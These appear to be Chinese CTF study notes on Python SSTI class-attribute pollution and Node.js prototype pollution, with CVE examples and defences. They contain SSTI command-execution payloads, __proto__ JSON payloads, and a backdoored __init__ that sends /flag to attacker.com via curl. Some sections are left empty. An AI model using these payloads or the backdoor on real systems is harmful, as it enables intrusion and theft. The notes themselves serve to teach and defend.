# 原型链污染（Prototype Pollution）

> **衔接说明**：前置知识（SSTI 原理、Jinja2 语法与沙箱逃逸、Flask 内置对象、无回显利用与内存马）已在笔记 1、2、3 中完整覆盖。本笔记专注于**原型链污染**这一专题，分 Python 类继承链污染和 Node.js 原型链污染两大方向展开。

# 第一部分：Python 类继承链污染

## 1.1 概念厘清

很多资料把 Python 和 JavaScript 的"原型链污染"混为一谈，实际上两者底层机制完全不同，需要首先区分清楚。

| 语言       | 机制名称                  | 核心概念                                       |
| ---------- | ------------------------- | ---------------------------------------------- |
| JavaScript | 原型链（Prototype Chain） | 每个对象有 `__proto__` 指向其原型对象          |
| Python     | 类继承链（MRO）           | 每个类有 `__bases__` 和 `__mro__` 描述继承关系 |

- JavaScript 的"原型链"是对象层面的：**实例** → `__proto__` → 原型对象
- Python 的"继承链"是类层面的：**子类** → `__bases__` → 父类 → `object`

虽然机制不同，但攻击目标类似：都是通过篡改"公共祖先"的属性，影响所有继承自它的对象。

------

## 1.2 Python 对象模型基础

这是理解利用链的底层基础，也是在沙箱逃逸笔记中反复用到的那些属性的系统整理。

### 1.2.1 核心魔术属性

#### `__class__`

返回对象所属的**类**。

```python
x = "hello"
print(x.__class__)         # <class 'str'>

n = 42
print(n.__class__)         # <class 'int'>

lst = [1, 2, 3]
print(lst.__class__)       # <class 'list'>
```

**在 SSTI 利用链中的作用**：从任意一个对象出发，进入类的世界，是利用链的第一跳。

```jinja2
{{ "".__class__ }}    {# 从字符串对象跳到 str 类 #}
```

------

#### `__bases__`

返回类的**直接父类**元组（只有一层，不是全部祖先）。

```python
class Animal:
    pass

class Dog(Animal):
    pass

print(Dog.__bases__)        # (<class 'Animal'>,)
print(Animal.__bases__)     # (<class 'object'>,)
print(object.__bases__)     # ()   ← object 是顶层，没有父类
```

**注意**：`__bases__` 是元组，要用索引 `[0]` 取第一个父类。

------

#### `__mro__`

MRO = Method Resolution Order，**方法解析顺序**。

返回从当前类到 `object` 的完整继承链列表，按查找属性时的顺序排列。

```python
class A: pass
class B(A): pass
class C(A): pass
class D(B, C): pass

print(D.__mro__)
# (<class '__main__.D'>, <class '__main__.B'>, <class '__main__.C'>, <class '__main__.A'>, <class 'object'>)
```

**为什么 MRO 重要**：

- `__mro__[-1]` 永远是 `object`，是所有类的共同祖先
- `__mro__[1]` 通常是直接父类
- SSTI 利用链中 `"".__class__.__mro__[1]` 就是在拿 `str` 的父类 `object`

```jinja2
{{ "".__class__.__mro__ }}
{# [<class 'str'>, <class 'object'>] #}

{{ "".__class__.__mro__[1] }}
{# <class 'object'> #}
```

------

#### `__subclasses__()`

返回当前类的**所有直接子类**列表（运行时动态生成）。

```python
print(object.__subclasses__())
# [<class 'type'>, <class 'weakref'>, ..., <class 'os._wrap_close'>, ...]
# 输出几百个类，包含所有已被导入的类
```

**这是沙箱逃逸的核心方法**：

- 通过 `object.__subclasses__()` 遍历所有子类
- 从中找到已经导入了 `os`、`subprocess` 等模块的类
- 借用它们的 `__globals__` 来执行命令

```jinja2
{{ "".__class__.__mro__[1].__subclasses__() }}
{# 等价于 object.__subclasses__() #}
```

------

#### `__dict__`

返回对象（或类）自身的**属性字典**，不包含继承来的属性。

```python
class Foo:
    x = 1
    def bar(self): pass

print(Foo.__dict__)
# {'x': 1, 'bar': <function Foo.bar>, '__doc__': None, ...}

f = Foo()
f.y = 2
print(f.__dict__)   # {'y': 2}   ← 只有实例自己的属性
```

**与 `__globals__` 的区别**：

| 属性          | 所属对象 | 内容                       |
| ------------- | -------- | -------------------------- |
| `__dict__`    | 类或实例 | 该对象自身定义的属性       |
| `__globals__` | 函数     | 函数所在模块的全局命名空间 |

------

#### `__globals__`

这是**函数对象**才有的属性，指向该函数所在**模块的全局命名空间**（一个字典）。

```python
import os

def my_func():
    pass

# my_func.__globals__ 就是这个模块的全局字典
# 里面有 os、其他导入的模块、全局变量等
print('os' in my_func.__globals__)   # True（如果这个模块导入了 os）
```

**在 SSTI 中的用法**（您的笔记中已大量出现）：

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
{# lipsum 是 Jinja2 内置函数，它的 __globals__ 里有 os 模块 #}
```

------

#### `__builtins__`

Python 的内置函数和异常的集合，通常存在于 `__globals__` 里。

```python
# 在函数的全局命名空间中访问
import builtins

# __builtins__ 可能是模块，也可能是字典，取决于访问位置
# 在 __globals__ 中通常是字典形式
print(type(my_func.__globals__['__builtins__']))  # <class 'dict'> 或 <class 'module'>
```

**通过 `__builtins__` 可以拿到**：

```python
__builtins__['eval']       # 执行字符串代码
__builtins__['open']       # 读取文件
__builtins__['__import__'] # 动态导入模块
__builtins__['exec']       # 执行多行代码
```

------

### 1.2.2 属性访问链路总结

```
任意对象（如 ""）
    │
    ├─ .__class__              → str 类
    │       │
    │       ├─ .__bases__      → (object,)
    │       ├─ .__mro__        → [str, object]
    │       └─ .__subclasses__() → [所有 str 的子类]
    │
    └─ （选取某个函数，如 lipsum）
            │
            └─ .__globals__    → 模块全局命名空间字典
                    │
                    ├─ ['os']         → os 模块
                    ├─ ['subprocess'] → subprocess 模块
                    └─ ['__builtins__'] → 内置函数字典
                                │
                                ├─ ['eval']
                                ├─ ['open']
                                └─ ['__import__']
```

## 1.3 Python 类属性污染原理+ merge()

记住找原型链污染的时候，很重要的一个危险函数是 **`merge()`**

### 1.3.1 什么是类属性污染

Python 中每个类都有自己的属性空间（存在 `__dict__` 里）。如果攻击者能够**向某个父类写入属性**，那么所有继承自该父类的子类实例，都会通过继承链"看到"这个被篡改的属性。

```python
class Base:
    is_admin = False

class UserA(Base): pass
class UserB(Base): pass

a = UserA()
b = UserB()

print(a.is_admin)   # False
print(b.is_admin)   # False

# ——— 污染发生 ———
Base.is_admin = True   # 修改父类属性

print(a.is_admin)   # True  ← 受影响
print(b.is_admin)   # True  ← 受影响
```

### 1.3.2 污染 `object` 类的效果

`object` 是所有 Python 类的顶层父类。如果能污染 `object`，影响范围就是**全局所有对象**。

```python
# 向 object 类写入一个新属性
object.hacked = "I am everywhere"

class Foo: pass
class Bar: pass

print(Foo().hacked)   # "I am everywhere"
print(Bar().hacked)   # "I am everywhere"
print("".hacked)      # "I am everywhere"
print([].hacked)      # "I am everywhere"
```

> [!CAUTION] 这在真实 Python 环境下是有效的。在 Jinja2 SSTI 的利用中，通常不直接污染 `object`，而是污染特定的配置类或业务类。

### 1.3.3 与 JavaScript 原型链污染的完整对比

| 对比点       | JavaScript 原型链污染         | Python 类属性污染                     |
| ------------ | ----------------------------- | ------------------------------------- |
| 污染祖先     | `Object.prototype`            | `object` 类 或 某个父类               |
| 触发方式     | 不安全的 `merge({}, payload)` | 不安全的 `setattr` 或 `__dict__` 写入 |
| 影响范围     | 所有普通对象（全局）          | 该类及所有子类的实例                  |
| 利用关键词   | `__proto__`、`constructor`    | `__class__`、`__bases__`、`__mro__`   |
| 与 SSTI 关系 | 通常先污染再触发模板引擎      | SSTI 本身即可直接利用继承链           |
| CTF 常见形式 | Node.js 中 JSON merge 漏洞    | Jinja2 SSTI 中的沙箱逃逸              |

## 1.4 Python 污染实际利用场景

### 1.4.1 场景一：通过 SSTI 修改配置类属性（权限绕过）

**漏洞代码**：

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

class Config:
    is_admin = False

@app.route('/info')
def info():
    name = request.args.get('name', 'guest')
    # ❌ 危险：用户输入拼入模板
    return render_template_string(f"Hello {name}, admin={Config.is_admin}")
```

**正常请求**：

```
GET /info?name=Alice
→ Hello Alice, admin=False
```

**攻击 payload**：

```
GET /info?name={{ config.__class__.__init__.__globals__['__builtins__']['exec']("__import__('__main__').Config.is_admin=True") }}
```

或者更直接：

```jinja2
{{ "".__class__.__mro__[1].__subclasses__() }}
{# 先枚举子类，找到合适的跳板 #}
```

**执行效果**：

```
Config.is_admin 被修改为 True
所有后续请求：admin=True
```

------

### 1.4.2 场景二：污染 `__init__` 方法（持久化后门）

通过 SSTI 替换某个类的 `__init__` 方法，使其每次实例化时都执行恶意代码。

```python
# 攻击者通过 SSTI 执行以下逻辑
original_init = SomeClass.__init__

def backdoor_init(self, *args, **kwargs):
    import os
    os.system("curl http://attacker.com/$(cat /flag)")
    original_init(self, *args, **kwargs)

SomeClass.__init__ = backdoor_init
{# 在 Jinja2 中用 exec 实现 #}
{{ url_for.__globals__['__builtins__']['exec'](
    "import os\n"
    "TargetClass.__init__ = lambda self: os.popen('cat /flag > /tmp/out').read()"
) }}
```

------

### 1.4.3 场景三：`__init_subclass__` 的滥用（高级）

`__init_subclass__` 是 Python 3.6+ 引入的钩子，每当有子类继承某个类时自动调用。

```python
class Evil:
    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        # 每当有新的子类被定义，就执行恶意代码
        import os
        os.system("echo hacked")

# 只要有人定义继承自 Evil 的类，就会触发
class Victim(Evil):
    pass
# 输出: hacked
```

**利用场景**：在模块加载时触发，持久性强，难以察觉。

------

### 1.4.4 场景四：`__set_name__` 的滥用（高级）

`__set_name__` 在描述符（Descriptor）被赋值给类属性时自动调用。

```python
class MaliciousDescriptor:
    def __set_name__(self, owner, name):
        # 在描述符被赋值给类属性时触发
        import os
        os.system("id")

class Victim:
    attr = MaliciousDescriptor()   # ← 触发 __set_name__
```

**在 CTF 中的用法**：利用 SSTI 动态定义并赋值描述符，绕过沙箱。

## 1.5 Python 类属性污染防御

### 1.5.1 使用 `__slots__` 限制实例属性

`__slots__` 声明后，实例只能拥有指定的属性，无法动态添加新属性。

```python
class SafeConfig:
    __slots__ = ['username', 'role']   # 只允许这两个属性

c = SafeConfig()
c.username = "alice"    # ✅ 正常
c.is_admin = True       # ❌ AttributeError: 'SafeConfig' has no attribute 'is_admin'
```

**局限**：`__slots__` 只限制实例属性，类属性仍可被修改（`SafeConfig.is_admin = True` 仍然有效）。

------

### 1.5.2 对外部输入的键名进行过滤

当需要根据用户输入动态设置对象属性时，必须过滤危险字段。

```python
FORBIDDEN_KEYS = {'__class__', '__bases__', '__mro__', '__subclasses__',
                  '__globals__', '__builtins__', '__init__', '__dict__'}

def safe_setattr(obj, key, value):
    if key in FORBIDDEN_KEYS or key.startswith('__'):
        raise ValueError(f"Forbidden key: {key}")
    setattr(obj, key, value)
```

------

### 1.5.3 使用 `dataclasses` + `frozen=True`

`frozen=True` 创建不可变的数据类，实例化后无法修改任何属性。

```python
from dataclasses import dataclass

@dataclass(frozen=True)
class Config:
    is_admin: bool = False
    role: str = "user"

c = Config()
c.is_admin = True   # ❌ FrozenInstanceError: cannot assign to field 'is_admin'
```

# 第二部分：Node.js 原型链污染

## 2.1 JavaScript 原型链机制（必读基础）

### 2.1.1 `prototype` vs `__proto__`

这两个属性经常被混淆，是理解原型链的关键。

| 属性        | 属于谁       | 含义                                     |
| ----------- | ------------ | ---------------------------------------- |
| `prototype` | **函数/类**  | 该函数作为构造函数时，实例的原型对象     |
| `__proto__` | **对象实例** | 该实例的原型，即其构造函数的 `prototype` |

```javascript
function Animal(name) {
    this.name = name;
}
Animal.prototype.speak = function() {
    return `${this.name} makes a sound.`;
};

let dog = new Animal("Rex");

// 关系验证
console.log(dog.__proto__ === Animal.prototype);   // true
console.log(Animal.prototype.constructor === Animal); // true

// 属性查找
console.log(dog.speak());   // "Rex makes a sound."
// dog 自身没有 speak → 去 dog.__proto__ (Animal.prototype) 找 → 找到了
```

------

### 2.1.2 原型链的查找顺序

JavaScript 查找对象属性时，按照以下顺序逐级向上：

```
dog (实例)
  └─ __proto__ → Animal.prototype
                    └─ __proto__ → Object.prototype
                                      └─ __proto__ → null（终点）
let obj = { x: 1 };

// 查找 obj.x
// 1. obj 自身有 x → 返回 1

// 查找 obj.toString
// 1. obj 自身没有 toString
// 2. obj.__proto__ (Object.prototype) 有 toString → 返回该方法

// 查找 obj.nonExistent
// 1. obj 自身没有
// 2. Object.prototype 没有
// 3. null → 返回 undefined
```

------

### 2.1.3 `Object.prototype` 的核心地位

`Object.prototype` 是所有普通对象的**最终祖先**，它上面的任何属性，所有对象都能访问到。

```javascript
// 验证：所有对象都继承自 Object.prototype
let obj = {};
let arr = [];
let str = new String("hello");

console.log(obj.__proto__ === Object.prototype);   // true
console.log(arr.__proto__.__proto__ === Object.prototype); // true（数组的原型链多一层）
```

**这就是原型链污染如此危险的原因**：一旦 `Object.prototype` 被污染，影响的是所有 JavaScript 对象。

------

### 2.1.4 `hasOwnProperty` 的作用

`hasOwnProperty` 用于判断属性是否是对象**自身**的（不含继承），是防御原型链污染的常用手段之一。

```javascript
let obj = { x: 1 };

console.log(obj.hasOwnProperty('x'));        // true（自身属性）
console.log(obj.hasOwnProperty('toString')); // false（继承自 Object.prototype）

// 在遍历对象时，通常需要加此检查
for (let key in obj) {
    if (obj.hasOwnProperty(key)) {
        // 只处理自身属性，忽略继承属性
    }
}
```

> [!CAUTION] 如果 `Object.prototype` 已被污染，`hasOwnProperty` 本身也可能被覆盖，所以更安全的写法是： `Object.prototype.hasOwnProperty.call(obj, key)`

## 2.2 Node.js 原型链污染原理

### 2.2.1 污染的本质

原型链污染的核心是：**通过向 `Object.prototype` 写入属性，使所有对象都"凭空"拥有该属性**。

污染的前提：代码中存在类似如下的**递归对象合并**操作，且未对键名进行过滤：

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);   // ← 递归，危险在这里
        } else {
            target[key] = source[key];          // ← 直接赋值，未检查键名
        }
    }
    return target;
}
```

**攻击者构造的 payload（JSON）**：

```json
{
    "__proto__": {
        "isAdmin": true
    }
}
```

**执行过程拆解**：

```javascript
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
let target = {};

merge(target, payload);

// merge 执行时：
// key = "__proto__"，source["__proto__"] 是对象
// 递归进入：merge(target["__proto__"], { isAdmin: true })
// target["__proto__"] 就是 target 的原型，即 Object.prototype
// 向 Object.prototype 写入 isAdmin = true

// 效果：
let victim = {};
console.log(victim.isAdmin);  // true ← 污染成功！
```

------

### 2.2.2 三条经典触发路径

#### 路径一：`__proto__` 直接路径（最常见）

```javascript
// payload
{"__proto__": {"polluted": true}}

// 触发
obj["__proto__"]["polluted"] = true;
// 等价于
Object.prototype["polluted"] = true;
```

------

#### 路径二：`constructor.prototype` 路径

```javascript
// payload
{"constructor": {"prototype": {"polluted": true}}}

// 触发
obj["constructor"]["prototype"]["polluted"] = true;
// obj.constructor → Object 构造函数
// Object.prototype["polluted"] = true
```

**绕过场景**：某些防御只过滤了 `__proto__`，但忘了过滤 `constructor`。

------

#### 路径三：嵌套键路径（任意深度）

```javascript
// 当代码是：obj[a][b] = val，且 a、b 均由用户控制
// payload: a = "__proto__", b = "polluted", val = true

// 等价于
obj["__proto__"]["polluted"] = true;
```

**典型漏洞代码**：

```javascript
// 根据用户输入动态设置配置（危险！）
app.post('/config', (req, res) => {
    let config = {};
    let { category, key, value } = req.body;
    config[category][key] = value;   // ← category = "__proto__", key = "isAdmin"
    res.json({ success: true });
});
```

------

### 2.2.3 污染前后的对比演示

```javascript
// ——— 污染前 ———
let a = {};
let b = {};

console.log(a.isAdmin);    // undefined
console.log(b.isAdmin);    // undefined

// ——— 执行污染 ———
let malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');

function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            merge(target[key] = target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

merge({}, malicious);

// ——— 污染后 ———
let c = {};      // 全新创建的对象
let d = [];      // 数组也受影响

console.log(c.isAdmin);    // true  ← 全新对象也被污染
console.log(d.isAdmin);    // true  ← 数组也被污染
console.log({}.isAdmin);   // true  ← 字面量也被污染
```

## 2.3 Node.js SSTI 常见模板引擎

### 2.3.1 Pug（原 Jade）

**基本语法**（缩进式，无需闭合标签）：

```pug
//- 变量输出
h1= title
p Hello, #{name}!

//- 非转义输出（危险）
p !{userInput}

//- 控制流
if user.isAdmin
    p Welcome, Admin!
else
    p Access Denied.

//- 循环
ul
    each item in items
        li= item
```

| `= expr`  | 执行表达式并转义输出   | 视情况 |
| `!= expr` | 执行表达式并**不转义** | ⚠️ 危险 |

## 2.4 原型链污染结合 SSTI 的利用链

### 2.4.1 完整攻击链路（通用思路）

```
① 寻找不安全的 merge/clone 入口
   └─ 通常是接受 JSON 的 POST 接口
   
② 构造 __proto__ payload
   └─ {"__proto__": {"targetProp": "maliciousValue"}}
   
③ 确认污染成功
   └─ 访问一个会读取 targetProp 的接口，观察行为变化
   
④ 寻找能将污染属性带入代码执行的触发点
   └─ 模板引擎渲染时读取被污染的配置属性
   └─ 框架内部使用 new Function() 拼接被污染的字符串
   
⑤ 触发 RCE
   └─ 执行系统命令，读取 flag
```

### 2.4.2 典型 CVE 案例深度分析

#### CVE-2019-19919：Handlebars 原型链污染 RCE

**漏洞版本**：Handlebars < 4.3.0

**漏洞点**：Handlebars 的 `lookup` helper 在解析属性时未过滤 `__proto__`。

**影响**：攻击者可以通过构造特定模板语法，访问并操控原型链，最终实现 RCE。

**修复方案**：Handlebars 4.3.0 对 `__proto__`、`__defineGetter__` 等危险属性进行了黑名单过滤。

------

#### CVE-2019-10744：Lodash `merge` 深度合并污染

**漏洞版本**：Lodash < 4.17.12

**漏洞代码**（简化版）：

```javascript
const _ = require('lodash');

// 攻击者输入
let userInput = JSON.parse('{"__proto__": {"polluted": true}}');

// Lodash 的 merge 会递归合并，且旧版本不过滤 __proto__
_.merge({}, userInput);

// 污染效果
console.log({}.polluted);   // true
```

**修复**：Lodash 4.17.12 中对 `__proto__` 键进行了过滤：

```javascript
// 修复后的 baseAssignIn 增加了检查
if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    continue;
}
```

------

#### CVE-2019-11358：jQuery `$.extend()` 深拷贝污染

**漏洞版本**：jQuery < 3.4.0

**漏洞代码**：

```javascript
// jQuery 的深拷贝
$.extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

// 效果：Object.prototype.isAdmin = true
console.log({}.isAdmin);    // true
```

**修复**：jQuery 3.4.0 增加了对 `__proto__` 的过滤。

------

#### CVE-2022-37601：webpack-loader 污染

**漏洞版本**：loader-utils < 2.0.3

**漏洞点**：webpack loader 在解析 query string 时，未过滤 `__proto__`。

**payload URL**：

```
?__proto__.isAdmin=true
```

**解析后**：

```javascript
Object.prototype.isAdmin = "true";
```

## 2.5 污染的实际危害场景

### 2.5.1 权限绕过

**场景**：应用通过检查对象属性来判断权限。

### 2.5.3 RCE（远程代码执行）

**场景一：`NODE_OPTIONS` 环境变量污染**（理论场景，实际中较难触发）

```javascript

// 触发恶意代码加载
```

**场景三：EJS `outputFunctionName` 污染（CVE-2022-29078，可稳定复现）**

## 2.6 Node.js 原型链污染防御

### 2.6.1 `Object.create(null)` 创建无原型对象（最彻底）

```javascript
// 普通对象：有原型链
let normal = {};
console.log(normal.__proto__);    // Object.prototype

// 无原型对象：__proto__ 为 null，不继承任何属性
let safe = Object.create(null);
console.log(safe.__proto__);      // undefined

// 即使 Object.prototype 被污染，safe 也不受影响
Object.prototype.hacked = true;
console.log(safe.hacked);         // undefined ← 不受影响
```

**适用场景**：用作键值存储（替代普通对象当字典）时，推荐使用。

------

### 2.6.2 `Object.freeze(Object.prototype)`（运行时防护）

```javascript
// 冻结 Object.prototype，使其不可修改
Object.freeze(Object.prototype);

// 尝试污染
Object.prototype.hacked = true;
// 在严格模式下抛出 TypeError
// 非严格模式下静默失败

console.log({}.hacked);   // undefined ← 防御成功
```

**注意**：只冻结了 `Object.prototype`，`Array.prototype`、`Function.prototype` 等仍可能被污染，需要一并冻结。

```javascript
// 更全面的冻结
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Function.prototype);
```

------

### 2.6.3 键名黑名单过滤

```javascript
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function safeMerge(target, source) {
    for (let key in source) {
        // 过滤危险键名
        if (FORBIDDEN_KEYS.has(key)) continue;
        
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// 测试
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
safeMerge({}, payload);
console.log({}.isAdmin);   // undefined ← 防御成功
```

### 2.6.4 使用 `Map` 替代普通对象

`Map` 不继承自 `Object.prototype`（严格来说继承自 `Map.prototype`），且键名可以是任意类型，不存在原型链污染问题。

```javascript
// 危险：用普通对象存储用户输入的键值对
let config = {};
config[userKey] = userValue;   // 如果 userKey 是 "__proto__"，就污染了

// 安全：用 Map 存储
let safeConfig = new Map();
safeConfig.set(userKey, userValue);   // 键名是字符串，不影响原型链

console.log(safeConfig.get("__proto__"));   // 只是 Map 里的一条数据，不影响原型链
```

# 第三部分：Python vs Node.js 横向对比

## 3.1 机制层面对比

| 对比维度           | Python 类继承链污染                  | Node.js 原型链污染                     |
| ------------------ | ------------------------------------ | -------------------------------------- |
| **底层机制**       | 类继承（MRO）                        | 原型链（`__proto__`）                  |
| **污染目标**       | 父类的类属性（`ClassName.attr`）     | `Object.prototype` 的属性              |
| **典型触发**       | SSTI 中直接通过 `__class__` 等访问   | 不安全的 `merge/clone` + JSON 输入     |
| **影响范围**       | 该类及其所有子类的实例               | 所有普通对象（全局）                   |
| **与 SSTI 的关系** | SSTI 本身即可直接遍历继承链          | 通常先污染，再触发模板引擎漏洞         |
| **利用难度**       | 较简单（SSTI 直接利用）              | 较复杂（需要两步：污染 + 触发）        |
| **防御重点**       | 过滤 `__class__`、`__bases__` 等访问 | 过滤 `__proto__`、`constructor` 等键名 |

## 3.2 攻击流程对比

```
Python SSTI 利用链：
用户输入 → 拼入模板 → Jinja2 解析 {{ }} 
  → 访问 __class__.__mro__.__subclasses__() 
  → 找到有 __globals__ 的跳板 
  → 调用 os.popen() 
  → RCE

Node.js 原型链污染利用链：
用户输入（JSON）→ 不安全的 merge 函数 
  → __proto__ 键穿透到 Object.prototype 
  → 所有对象都获得污染属性 
  → 模板引擎读取被污染的配置属性 
  → new Function() 拼入污染字符串 
  → RCE
```
